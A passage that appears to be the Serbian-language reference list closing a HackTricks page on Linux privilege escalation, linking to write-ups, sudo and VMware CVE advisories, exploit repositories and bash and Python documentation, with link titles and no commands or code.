- [9] [Sudo (LD_PRELOAD) (eskalacija privilegija na Linuxu)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Prolazak kroz laboratorijske vežbe - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: saveti i trikovi za eskalaciju privilegija na Linuxu](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: alat za enumeraciju i eskalaciju privilegija na Linuxu](https://github.com/rtcrowley/linux-private-i)
- [14] [Šta je socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Pristupite D-BUS-u](https://www.linuxjournal.com/article/7744)
- [17] [SUID izvršne datoteke i eskalacija privilegija na Linuxu](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, drugi deo – eskalacija privilegija na Linuxu](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Kako upravljati ACL-ovima na Linuxu](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root preko network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Šta je systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash aritmetička injekcija preko logova, ceo lanac)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash priručnik – BASH_ENV (datoteka za pokretanje u neinteraktivnom režimu)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink eskalacija privilegija)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiranje pomoću pg_basebackup cron-a → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazovite ga kako god, VMware će ga podići (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacija privilegija preko Sudo Chroot-a](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – ranjivosti za eskalaciju privilegija u Sudo-u CVE-2025-32462 i CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – direktorijumi PYC repozitorijuma](https://peps.python.org/pep-3147/)
- [32] [Python importlib dokumentacija](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet korisnika @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Beleženje lozinki na Linuxu](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalji o race condition-u u logrotate-u](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 dokumentacija – `site` i datoteke za konfiguraciju putanja](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
